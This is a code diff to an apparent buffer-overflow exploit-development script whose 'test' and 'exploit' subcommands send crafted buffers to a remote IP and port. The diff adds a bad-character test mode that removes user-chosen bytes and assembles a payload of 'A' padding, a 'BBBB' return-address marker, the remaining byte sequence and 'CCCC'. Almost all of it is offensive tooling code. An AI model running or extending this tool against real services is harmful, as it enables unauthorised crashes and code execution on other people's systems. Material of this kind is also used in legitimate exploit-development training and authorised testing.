@@ -16,8 +16,9 @@ test_parser = _subparsers.add_parser('test',help='options for test')
 test_parser.add_argument('ip',type=str,help='ip of remote target')
 test_parser.add_argument('port',type=int,help='remote port')
 test_parser.add_argument('--len',type=int,help='size of buffer to send',default=1024)
-test_parser.add_argument('--buffer-type',type=str,choices=['a','pattern'],help='type of buffer to send',default='a')
+test_parser.add_argument('--buffer-type',type=str,choices=['a','pattern','badchars'],help='type of buffer to send',default='a')
 test_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
+test_parser.add_argument('-b',type=str,help='badchars to exclude from buffer seperated by commas (in integer form)')
 test_parser.add_argument('--post_command',type=str,help='server command to append buffer with (remember to escape backslashes)')
 
 exploit_parser = _subparsers.add_parser('exploit',help='options for exploit')
@@ -49,6 +50,8 @@ if __name__ == '__main__':
 
 		if(args.command != None):
 			buffer = args.command.encode()
+		else:
+			buffer = b''
 
 		if(args.buffer_type=='a'):
 			buffer += b'A'*args.len
@@ -56,6 +59,20 @@ if __name__ == '__main__':
 
 		elif(args.buffer_type=='pattern'):
 			buffer=pattern[0:args.len]
+
+		elif(args.buffer_type=='badchars'):
+			if(args.b == None):
+				pass
+			else:
+				exclude_list = [int(x) for x in args.b.split(',')]
+				for bc in exclude_list:
+					if(bc>255 or bc <0):
+						print('badchar values between 0-255 only! quitting...')
+						sys.exit(1)
+					badchars = badchars.replace(bytes([bc]),b'') #replace badchar from exclude_list with empty
+			buffer += b'A'*(args.len - 4)+b'BBBB'+badchars+b'CCCC'
+
+
 
 		if(args.post_command != None):
 			args.post_command=args.post_command.replace('\\n','\n')
